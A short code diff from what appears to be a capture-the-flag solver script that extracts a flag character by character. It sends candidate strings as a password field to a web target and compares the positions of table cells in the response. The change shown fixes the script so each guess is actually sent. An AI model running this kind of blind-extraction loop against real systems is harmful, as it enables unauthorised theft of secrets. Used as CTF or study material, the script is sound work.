@@ -6,8 +6,9 @@ str='-0123456789abcdefghijklmnopqrstuvwxyz{|}'
 flag=""
 for i in range(48):
     for j in range(0,len(str)):
+        index=flag+str[j]
         data={
-            'password':flag
+            'password':index
         }
         t=requests.get(url,data=data,params=param,cookies=cookie,timeout=1).text
         if t.find(f"<td>{flag}</td>")>t.find("<td>flag</td>"):
